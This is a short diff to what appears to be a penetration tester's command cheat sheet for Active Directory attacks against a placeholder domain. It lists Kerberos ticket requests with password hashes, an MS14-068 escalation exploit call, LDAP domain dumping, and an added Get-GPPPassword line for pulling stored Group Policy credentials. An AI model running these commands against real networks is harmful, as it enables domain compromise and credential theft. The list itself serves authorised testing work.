@@ -278,4 +278,5 @@ pypykatz kerberos tgt "kerberos+rc4://BREAKING.BAD\someuser:bb38628253e7681553b7
 ms14-068.py -u someuser@breaking.bad --rc4 0123456789krbtgtnthash0123456789 -s S-1-5-11-39129514-1145628974-103568174 -d dc01.breaking.bad
 getST.py -k -no-pass -spn host/dc01.breaking.bad breaking.bad/someuser
 ldapdomaindump --user 'breaking.bad\someuser' --password 'somepassword' --outdir ldapdomaindump dc01.breaking.bad
+Get-GPPPassword -debug -no-pass dc01.breaking.bad
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
